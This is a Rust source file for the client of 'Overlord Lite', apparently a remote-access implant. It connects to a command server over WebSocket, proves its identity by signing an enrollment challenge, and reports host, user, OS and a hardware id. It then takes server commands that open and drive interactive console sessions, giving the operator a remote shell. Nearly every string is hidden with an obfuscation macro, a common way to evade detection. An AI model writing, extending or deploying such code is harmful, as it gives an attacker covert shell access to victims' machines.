use std::{
    sync::LazyLock,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use crate::{
    config::{Config, ServerUrl},
    console::ConsoleHub,
    identity::Identity,
    obfstr,
    protocol::{self, CommandResult, Hello, Ping},
    tls,
};
use anyhow::{Context, Result, anyhow, bail};
use futures_util::{SinkExt, StreamExt};
use rmpv::Value;
use tokio::net::TcpStream;
use tokio_tungstenite::{
    MaybeTlsStream, WebSocketStream, connect_async_tls_with_config,
    tungstenite::{
        Message,
        client::IntoClientRequest,
        http::{HeaderName, HeaderValue},
    },
};

type Socket = WebSocketStream<MaybeTlsStream<TcpStream>>;

static API_CLIENTS_PREFIX: LazyLock<String> = LazyLock::new(|| obfstr!("/api/clients/"));
static STREAM_WS_SUFFIX: LazyLock<String> = LazyLock::new(|| obfstr!("/stream/ws"));
static ROLE_CLIENT: LazyLock<String> = LazyLock::new(|| obfstr!("role=client"));
static WEBSOCKET_PROTOCOL_HEADER: LazyLock<String> =
    LazyLock::new(|| obfstr!("Sec-WebSocket-Protocol"));
static AGENT_TOKEN_HEADER: LazyLock<String> = LazyLock::new(|| obfstr!("x-agent-token"));
static BINARY_PROTOCOL: LazyLock<String> = LazyLock::new(|| obfstr!("binary"));
static FIELD_TYPE: LazyLock<String> = LazyLock::new(|| obfstr!("type"));
static FIELD_NONCE: LazyLock<String> = LazyLock::new(|| obfstr!("nonce"));
static FIELD_STATUS: LazyLock<String> = LazyLock::new(|| obfstr!("status"));
static FIELD_ID: LazyLock<String> = LazyLock::new(|| obfstr!("id"));
static FIELD_COMMAND_TYPE: LazyLock<String> = LazyLock::new(|| obfstr!("commandType"));
static FIELD_COMMAND_VERSION: LazyLock<String> = LazyLock::new(|| obfstr!("commandVersion"));
static FIELD_PAYLOAD: LazyLock<String> = LazyLock::new(|| obfstr!("payload"));
static FIELD_SESSION_ID: LazyLock<String> = LazyLock::new(|| obfstr!("sessionId"));
static FIELD_DATA: LazyLock<String> = LazyLock::new(|| obfstr!("data"));
static FIELD_COLS: LazyLock<String> = LazyLock::new(|| obfstr!("cols"));
static FIELD_ROWS: LazyLock<String> = LazyLock::new(|| obfstr!("rows"));
static FIELD_TS: LazyLock<String> = LazyLock::new(|| obfstr!("ts"));
static ENROLLMENT_CHALLENGE: LazyLock<String> = LazyLock::new(|| obfstr!("enrollment_challenge"));
static ENROLLMENT_STATUS: LazyLock<String> = LazyLock::new(|| obfstr!("enrollment_status"));
static HELLO: LazyLock<String> = LazyLock::new(|| obfstr!("hello"));
static HELLO_ACK: LazyLock<String> = LazyLock::new(|| obfstr!("hello_ack"));
static PING: LazyLock<String> = LazyLock::new(|| obfstr!("ping"));
static PONG: LazyLock<String> = LazyLock::new(|| obfstr!("pong"));
static COMMAND: LazyLock<String> = LazyLock::new(|| obfstr!("command"));
static COMMAND_RESULT: LazyLock<String> = LazyLock::new(|| obfstr!("command_result"));
static CONSOLE_START: LazyLock<String> = LazyLock::new(|| obfstr!("console_start"));
static CONSOLE_INPUT: LazyLock<String> = LazyLock::new(|| obfstr!("console_input"));
static CONSOLE_RESIZE: LazyLock<String> = LazyLock::new(|| obfstr!("console_resize"));
static CONSOLE_STOP: LazyLock<String> = LazyLock::new(|| obfstr!("console_stop"));
static CLIENT_VERSION: LazyLock<String> =
    LazyLock::new(|| format!("{}{}", obfstr!("rust-lite/"), env!("CARGO_PKG_VERSION")));

pub async fn run(config: &Config, identity: &Identity, server: &ServerUrl) -> Result<()> {
    let socket_url = format!(
        "{}{}{}{}?{}",
        server.as_str().trim_end_matches('/'),
        API_CLIENTS_PREFIX.as_str(),
        identity.client_id,
        STREAM_WS_SUFFIX.as_str(),
        ROLE_CLIENT.as_str(),
    );

    let mut request = socket_url.into_client_request()?;
    request.headers_mut().insert(
        HeaderName::from_bytes(WEBSOCKET_PROTOCOL_HEADER.as_bytes())?,
        HeaderValue::from_str(BINARY_PROTOCOL.as_str())?,
    );
    if let Some(token) = &config.agent_token {
        request.headers_mut().insert(
            HeaderName::from_bytes(AGENT_TOKEN_HEADER.as_bytes())?,
            HeaderValue::from_str(token)?,
        );
    }

    let connector = tls::websocket_connector(config.insecure_tls, &config.tls_spki_pins);
    let (mut socket, _) = connect_async_tls_with_config(request, None, true, connector)
        .await
        .with_context(|| format!("connect to {server}"))?;

    let first = tokio::time::timeout(Duration::from_secs(30), receive_envelope(&mut socket))
        .await
        .context("timed out waiting for enrollment challenge")??;
    let first_type = protocol::required_string(&first, FIELD_TYPE.as_str())?;
    let (public_key, signature, needs_ack) = if first_type == ENROLLMENT_CHALLENGE.as_str() {
        let nonce = protocol::required_string(&first, FIELD_NONCE.as_str())?;
        (
            identity.public_key_base64(),
            identity.sign_base64(nonce)?,
            true,
        )
    } else if first_type == HELLO_ACK.as_str() {
        (String::new(), String::new(), false)
    } else {
        bail!("unexpected first server message {first_type:?}")
    };

    let hello = Hello {
        message_type: HELLO.as_str(),
        id: &identity.client_id,
        hwid: &identity.client_id,
        host: hostname(),
        os: wire_os(),
        arch: wire_arch(),
        version: CLIENT_VERSION.as_str(),
        user: username(),
        monitors: 0,
        build_tag: config.build_tag.as_deref(),
        public_key: &public_key,
        signature: &signature,
        protocol_version: protocol::WIRE_PROTOCOL_VERSION,
        command_versions: protocol::command_versions(),
    };
    send_value(&mut socket, &hello).await?;

    if needs_ack {
        loop {
            let response =
                tokio::time::timeout(Duration::from_secs(30), receive_envelope(&mut socket))
                    .await
                    .context("timed out waiting for enrollment status")??;
            let response_type = protocol::required_string(&response, FIELD_TYPE.as_str())?;
            if response_type == HELLO_ACK.as_str() {
                break;
            } else if response_type == ENROLLMENT_STATUS.as_str() {
                let status =
                    protocol::string_field(&response, FIELD_STATUS.as_str()).unwrap_or("unknown");
                bail!("enrollment status is {status}");
            } else if response_type == PING.as_str() {
                send_protocol_pong(&mut socket, &response).await?;
            } else if response_type != PONG.as_str() {
                bail!("unexpected enrollment response {response_type:?}");
            }
        }
    }

    eprintln!("authenticated and connected as {}", identity.client_id);
    send_value(
        &mut socket,
        &Ping {
            message_type: PING.as_str(),
            ts: now_millis(),
        },
    )
    .await?;

    let mut heartbeat =
        tokio::time::interval(config.heartbeat_interval.max(Duration::from_secs(1)));
    heartbeat.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
    heartbeat.tick().await;
    let (console_tx, mut console_rx) = tokio::sync::mpsc::channel(64);
    let mut consoles = ConsoleHub::new(console_tx);

    loop {
        tokio::select! {
            _ = heartbeat.tick() => {
                send_value(&mut socket, &Ping { message_type: PING.as_str(), ts: now_millis() }).await?;
            }
            incoming = socket.next() => {
                let message = incoming.ok_or_else(|| anyhow!("server closed the WebSocket"))??;
                match message {
                    Message::Binary(bytes) => {
                        let envelope = protocol::decode(&bytes)?;
                        handle_envelope(&mut socket, &mut consoles, &envelope).await?;
                    }
                    Message::Ping(bytes) => socket.send(Message::Pong(bytes)).await?,
                    Message::Pong(_) => {}
                    Message::Close(frame) => bail!("server closed the session: {frame:?}"),
                    Message::Text(_) | Message::Frame(_) => {}
                }
            }
            output = console_rx.recv() => {
                if let Some(output) = output {
                    socket.send(Message::Binary(output.into())).await?;
                }
            }
        }
    }
}

async fn handle_envelope(
    socket: &mut Socket,
    consoles: &mut ConsoleHub,
    envelope: &Value,
) -> Result<()> {
    let message_type = protocol::required_string(envelope, FIELD_TYPE.as_str())?;
    if message_type == PING.as_str() {
        send_protocol_pong(socket, envelope).await?;
    } else if message_type == COMMAND.as_str() {
        handle_command(socket, consoles, envelope).await?;
    } else if message_type != PONG.as_str() && message_type != HELLO_ACK.as_str() {
        eprintln!("ignoring unsupported server message {message_type}");
    }
    Ok(())
}

async fn handle_command(
    socket: &mut Socket,
    consoles: &mut ConsoleHub,
    envelope: &Value,
) -> Result<()> {
    let command = protocol::required_string(envelope, FIELD_COMMAND_TYPE.as_str())?;
    if !is_console_command(command) {
        return send_unsupported_command(socket, envelope).await;
    }

    let command_id = protocol::string_field(envelope, FIELD_ID.as_str()).unwrap_or("");
    let command_version = protocol::integer_field(envelope, FIELD_COMMAND_VERSION.as_str())
        .unwrap_or(1)
        .max(1) as u16;
    if command_version != 1 {
        return send_command_result(
            socket,
            command_id,
            command,
            command_version,
            false,
            Some("unsupported console command version"),
            Some("unsupported_command_version"),
        )
        .await;
    }

    let payload = protocol::field(envelope, FIELD_PAYLOAD.as_str()).unwrap_or(&Value::Nil);
    let session_id = protocol::string_field(payload, FIELD_SESSION_ID.as_str()).unwrap_or("");
    let result = if command == CONSOLE_START.as_str() {
        consoles.start(
            session_id,
            protocol::integer_field(payload, FIELD_COLS.as_str()).unwrap_or(0),
            protocol::integer_field(payload, FIELD_ROWS.as_str()).unwrap_or(0),
        )
    } else if command == CONSOLE_INPUT.as_str() {
        if session_id.is_empty() {
            Ok(())
        } else {
            let data = protocol::string_field(payload, FIELD_DATA.as_str()).unwrap_or("");
            consoles.write(session_id, data)
        }
    } else if command == CONSOLE_RESIZE.as_str() {
        if session_id.is_empty() {
            Ok(())
        } else {
            consoles.resize(
                session_id,
                protocol::integer_field(payload, FIELD_COLS.as_str()).unwrap_or(0),
                protocol::integer_field(payload, FIELD_ROWS.as_str()).unwrap_or(0),
            )
        }
    } else {
        if !session_id.is_empty() {
            consoles.stop(session_id);
        }
        Ok(())
    };

    match result {
        Ok(()) => send_command_result(socket, command_id, command, 1, true, None, None).await,
        Err(error) => {
            let message = error.to_string();
            send_command_result(
                socket,
                command_id,
                command,
                1,
                false,
                Some(&message),
                Some("console_error"),
            )
            .await
        }
    }
}

async fn send_command_result(
    socket: &mut Socket,
    command_id: &str,
    command_type: &str,
    command_version: u16,
    ok: bool,
    message: Option<&str>,
    error_code: Option<&str>,
) -> Result<()> {
    send_value(
        socket,
        &CommandResult {
            message_type: COMMAND_RESULT.as_str(),
            command_id,
            command_type,
            command_version,
            ok,
            message,
            error_code,
        },
    )
    .await
}

async fn send_unsupported_command(socket: &mut Socket, envelope: &Value) -> Result<()> {
    let command = protocol::required_string(envelope, FIELD_COMMAND_TYPE.as_str())?;
    let command_id = protocol::string_field(envelope, FIELD_ID.as_str()).unwrap_or("");
    let version = protocol::integer_field(envelope, FIELD_COMMAND_VERSION.as_str())
        .unwrap_or(1)
        .max(1) as u16;
    send_value(
        socket,
        &CommandResult {
            message_type: COMMAND_RESULT.as_str(),
            command_id,
            command_type: command,
            command_version: version,
            ok: false,
            message: Some("command is not supported by Overlord Lite"),
            error_code: Some("unsupported_command"),
        },
    )
    .await
}

async fn receive_envelope(socket: &mut Socket) -> Result<Value> {
    loop {
        match socket
            .next()
            .await
            .ok_or_else(|| anyhow!("server closed the WebSocket"))??
        {
            Message::Binary(bytes) => return protocol::decode(&bytes),
            Message::Ping(bytes) => socket.send(Message::Pong(bytes)).await?,
            Message::Pong(_) | Message::Text(_) | Message::Frame(_) => {}
            Message::Close(frame) => bail!("server closed the session: {frame:?}"),
        }
    }
}

async fn send_value<T: serde::Serialize>(socket: &mut Socket, value: &T) -> Result<()> {
    socket
        .send(Message::Binary(protocol::encode(value)?.into()))
        .await?;
    Ok(())
}

async fn send_protocol_pong(socket: &mut Socket, incoming: &Value) -> Result<()> {
    send_value(
        socket,
        &Ping {
            message_type: PONG.as_str(),
            ts: protocol::integer_field(incoming, FIELD_TS.as_str()).unwrap_or_else(now_millis),
        },
    )
    .await
}

fn is_console_command(command: &str) -> bool {
    command == CONSOLE_START.as_str()
        || command == CONSOLE_INPUT.as_str()
        || command == CONSOLE_RESIZE.as_str()
        || command == CONSOLE_STOP.as_str()
}

fn hostname() -> String {
    std::env::var(if cfg!(windows) {
        "COMPUTERNAME"
    } else {
        "HOSTNAME"
    })
    .ok()
    .filter(|value| !value.trim().is_empty())
    .unwrap_or_else(|| "unknown".to_owned())
}

fn username() -> String {
    std::env::var(if cfg!(windows) { "USERNAME" } else { "USER" })
        .ok()
        .filter(|value| !value.trim().is_empty())
        .unwrap_or_else(|| "unknown".to_owned())
}

fn wire_os() -> &'static str {
    match std::env::consts::OS {
        "macos" => "darwin",
        other => other,
    }
}

fn wire_arch() -> &'static str {
    match std::env::consts::ARCH {
        "x86_64" => "amd64",
        "aarch64" => "arm64",
        "x86" => "386",
        other => other,
    }
}

fn now_millis() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as i64
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::{Engine as _, engine::general_purpose::STANDARD};
    use ed25519_dalek::{Signature, VerifyingKey};
    use tempfile::tempdir;
    use tokio::net::TcpListener;
    use tokio_tungstenite::accept_hdr_async;

    #[tokio::test]
    #[allow(clippy::result_large_err)] // Required by tungstenite's handshake callback signature.
    async fn authenticates_and_advertises_console_commands() {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let address = listener.local_addr().unwrap();
        let state = tempdir().unwrap();
        let identity = Identity::load_or_create(state.path()).unwrap();
        let server_url = ServerUrl::parse(&format!("ws://{address}")).unwrap();
        let config = Config {
            servers: vec![server_url.clone()],
            agent_token: Some("test-agent-token".to_owned()),
            build_tag: Some("test-build-tag".to_owned()),
            insecure_tls: true,
            tls_spki_pins: Vec::new(),
            state_dir: state.path().to_owned(),
            reconnect_delay: Duration::from_millis(1),
            heartbeat_interval: Duration::from_secs(60),
        };
        let expected_client_id = identity.client_id.clone();

        let mock_server = tokio::spawn(async move {
            let (tcp, _) = listener.accept().await.unwrap();
            let mut socket = accept_hdr_async(tcp, |request: &tokio_tungstenite::tungstenite::handshake::server::Request, mut response: tokio_tungstenite::tungstenite::handshake::server::Response| {
                assert_eq!(request.headers()["x-agent-token"], "test-agent-token");
                assert!(request.uri().path().contains(&expected_client_id));
                response.headers_mut().insert("Sec-WebSocket-Protocol", HeaderValue::from_static("binary"));
                Ok(response)
            }).await.unwrap();

            let nonce = [7u8; 32];
            let challenge = serde_json::json!({ "type": "enrollment_challenge", "nonce": STANDARD.encode(nonce) });
            socket
                .send(Message::Binary(
                    protocol::encode(&challenge).unwrap().into(),
                ))
                .await
                .unwrap();

            let Message::Binary(hello_bytes) = socket.next().await.unwrap().unwrap() else {
                panic!("expected binary hello")
            };
            let hello = protocol::decode(&hello_bytes).unwrap();
            assert_eq!(protocol::string_field(&hello, "type"), Some("hello"));
            assert_eq!(
                protocol::string_field(&hello, "buildTag"),
                Some("test-build-tag")
            );
            assert_eq!(
                protocol::string_field(&hello, "version"),
                Some(concat!("rust-lite/", env!("CARGO_PKG_VERSION")))
            );
            let command_versions = protocol::field(&hello, "commandVersions")
                .unwrap()
                .as_map()
                .unwrap();
            assert_eq!(command_versions.len(), 4);
            for command in [
                "console_input",
                "console_resize",
                "console_start",
                "console_stop",
            ] {
                assert!(
                    command_versions
                        .iter()
                        .any(|(key, _)| key.as_str() == Some(command))
                );
            }

            let public_key: [u8; 32] = STANDARD
                .decode(protocol::required_string(&hello, "publicKey").unwrap())
                .unwrap()
                .try_into()
                .unwrap();
            let signature = Signature::from_slice(
                &STANDARD
                    .decode(protocol::required_string(&hello, "signature").unwrap())
                    .unwrap(),
            )
            .unwrap();
            VerifyingKey::from_bytes(&public_key)
                .unwrap()
                .verify_strict(&nonce, &signature)
                .unwrap();

            let ack = serde_json::json!({ "type": "hello_ack", "id": expected_client_id, "protocolVersion": 1 });
            socket
                .send(Message::Binary(protocol::encode(&ack).unwrap().into()))
                .await
                .unwrap();
            let Message::Binary(ping_bytes) = socket.next().await.unwrap().unwrap() else {
                panic!("expected initial ping")
            };
            assert_eq!(
                protocol::string_field(&protocol::decode(&ping_bytes).unwrap(), "type"),
                Some("ping")
            );
            socket.close(None).await.unwrap();
        });

        assert!(run(&config, &identity, &server_url).await.is_err());
        mock_server.await.unwrap();
    }
}
